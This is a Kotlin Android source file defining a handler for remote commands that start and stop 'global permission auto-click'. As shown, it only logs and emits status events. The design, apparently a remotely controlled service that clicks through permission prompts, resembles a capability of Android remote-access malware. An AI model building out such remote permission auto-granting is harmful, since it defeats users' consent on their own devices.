package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

class PermissionCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "PermissionCmd"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "START_GLOBAL_PERMISSION_AUTO_CLICK",
        "STOP_GLOBAL_PERMISSION_AUTO_CLICK"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val service = context.service ?: return
        Log.i(TAG, "Permission command: $command")

        when (command) {
            "START_GLOBAL_PERMISSION_AUTO_CLICK" -> {
                context.sendEvent("permission_auto_click_status", JSONObject().apply {
                    put("enabled", true)
                })
            }
            "STOP_GLOBAL_PERMISSION_AUTO_CLICK" -> {
                context.sendEvent("permission_auto_click_status", JSONObject().apply {
                    put("enabled", false)
                })
            }
        }
    }
}
